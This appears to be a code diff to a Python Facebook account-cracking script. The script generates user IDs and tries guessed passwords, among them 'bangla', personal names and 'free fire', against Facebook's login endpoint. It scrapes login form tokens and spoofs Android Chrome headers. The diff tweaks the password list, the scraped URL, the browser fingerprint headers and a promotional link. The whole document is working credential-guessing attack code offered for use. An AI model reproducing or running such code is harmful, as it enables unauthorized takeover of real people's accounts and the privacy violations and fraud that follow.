@@ -80,7 +80,7 @@ G = '\x1b[1;95m'
 P = '\033[1;37m'
 def JUBAYER():
     os.system('clear')
-    os.system('xdg-open https://t.me/The_Monster_401/')
+    os.system('xdg-open https://github.com/JUBAYER-420/JK.JUBAYER/')
     print(logo)
     print(f"\033[1;31m[\033[1;96m1\033[1;31m] \033[1;32mRANDOM CLONING")   
     print(f"\033[1;31m[\033[1;96m2\033[1;31m] \033[1;31mEXIT")
@@ -120,7 +120,7 @@ def main():
         print('\033[1;32m='*50)
         for guru in user:
             uid = nude+nudex+nud+guru
-            pwx = [nude+nudex+nud+guru,nud+guru,nudex+guru,nude+nudex+nud,'bangla']
+            pwx = [nude+nudex+nud+guru,nud+guru,nudex+guru,nude+nudex+nud,'bangla''free fire''mahi Akther''sumaiya akther''firstlast''first@@']
             JUBAYER.submit(rcrack,uid,pwx,tl)
     print ('\033[1;31m==================================================           ')
     print('\033[1;37m[\033[1;32m~\033[1;37m] CRACK SUCCESSFULLY COMPLETED..')
@@ -137,7 +137,7 @@ def rcrack(uid,pwx,tl):
             bi = random.choice([A,B,C,D,E,F,G,H])
             sys.stdout.write(f'\r \033[1;31m[%sJUBAYER-AHAMED\033[1;31m]\033[1;34m\033[1;31m[\033[38;5;195m%s/%s\033[1;31m]\033[1;34m\033[38;5;45mOK-\033[38;5;46m%s\r'%(bi,loop,tl,len(oks))),
             sys.stdout.flush()
-            free_fb = session.get('https://free.facebook.com').text
+            free_fb = session.get('https://www.facebook.com/groups/1052341908998431/?ref=share').text
             log_data = {
                 "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
             "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
@@ -154,12 +154,12 @@ def rcrack(uid,pwx,tl):
     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
     'accept-language': 'en-US,en;q=0.9',
     'cache-control': 'max-age=0',
-    'dpr': '1.875',
+    'dpr': '1.7000000476837158',
     'sec-ch-prefers-color-scheme': 'dark',
     'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
-    'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.24"',
+    'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.116"',
     'sec-ch-ua-mobile': '?1',
-    'sec-ch-ua-model': '"BE2013"',
+    'sec-ch-ua-model': '"RMX2189"',
     'sec-ch-ua-platform': '"Android"',
     'sec-ch-ua-platform-version': '"11.0.0"',
     'sec-fetch-dest': 'document',
@@ -167,7 +167,7 @@ def rcrack(uid,pwx,tl):
     'sec-fetch-site': 'none',
     'sec-fetch-user': '?1',
     'upgrade-insecure-requests': '1',
-    'user-agent': pro,
+    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36',
     'viewport-width': '980',}
             lo = session.post('https://free.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
